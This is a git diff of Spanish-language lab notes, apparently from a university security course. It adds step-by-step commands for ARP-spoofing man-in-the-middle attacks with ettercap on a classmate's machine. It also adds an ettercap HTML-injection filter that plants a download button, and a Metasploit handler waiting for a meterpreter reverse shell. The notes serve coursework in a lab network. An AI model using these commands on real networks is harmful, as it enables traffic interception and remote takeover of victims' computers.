@@ -760,10 +760,13 @@ De esta forma el ModSecurity utilizará las reglas que le hemos dicho en el arch
 systemctl restart apache2
 ```
 
-***PROBAR SERVIDOR APACHE CONTRA ATAQUES***
+***NOTAS***
 
+Si necesitamos pasar algo a la maquina de alex:
 
-
+```
+scp lsi@10.11.48.207:/home/lsi/nombre_archivo lsi@10.11.48.203:/home/lsi/
+```
 
 
 ***DEFENSA PRACTICA 2***
@@ -782,7 +785,11 @@ Comando de ataque:
 ettercap -Tq -M arp:remote -P remote_browser /10.11.48.203// /10.11.48.1// -w /home/lsi/Descargas/apartado_f
 ```
 
-El que esta siendo atacado tiene que visitar una web con lynx ( que es el navegador que tenemos puesto en el /etc/ettercap.etter.conf
+Alex ejecuta con el lynx contra alguan pagina web:
+
+```
+lynx www.lavozdegalicia.es
+```
 
 **2. Segmento 2002 y Local-links:**
 
@@ -847,20 +854,55 @@ sysinfo
 
 **4. Filtro ettercap:**
 
-En el filtro lo que hacemos es meter una accion que al pulsar el boton ejecuta la terminal del shell que usamos en el metasploit.
+En el filtro lo que hacemos es meter una accion que al pulsar el boton inyecta el expoloit.
 
-Lanzamos el ataque contra Alex:
+Para probarlo:
+Desde el atacante tenemos que abrir 2 consolas:
+
+En una abrimos el msfconsole:
 
 ```
-ettercap -Tq -F html.ef -i ens33 -P repoison_arp -M arp:remote /10.11.48.203// /10.11.48.1//
+msfconsole
+```
+
+```
+use exploit/multi/handler
+```
+
+```
+set payload linux/x64/meterpreter_reverse_tcp
+```
+
+```
+set lhost 10.11.48.207
+```
+
+```
+set lport 1234
+```
+
+```
+exploit
+```
+
+En la otra consola Lanzamos el ataque con el filtro que hemos creado:
+
+```
+ettercap -Tq -F prueba_filtro.ef -i ens33 -P repoison_arp -M arp:remote /10.11.48.203// /10.11.48.1//
 
 ```
 
-Cuando alex hace una peticion w3m contra www.google.es le sale lo de software malicioso, descargar ahora, y al darle a boton deberian descargarse y ejecutar el ./origen_shell.
+Una vez en este punto alex lanza una peticion contra cualquier pagina web:
+
+```
+lynx www.google.es
+```
+
+Cuando Alex hace dicha peticion le aparece el boton que hemos metido en el filtro, el tiene que pulsarlo y en la maquina atacante nso aparecera html injected
+Como tenemos en nuestro servidor apache el shell que hemos creado en /var/www/html cuando el haga una peticion a una web, la hara a nuestro server apache.
 
 
-1. Alex mueve el origen shell a su apache var/www/html 
-2. Luego le hago el ataque con el filtro
+
 
 ```
 ettercap -Tq -F html.ef -i ens33 -P repoison_arp -M arp:remote /10.11.48.203// /10.11.48.1//
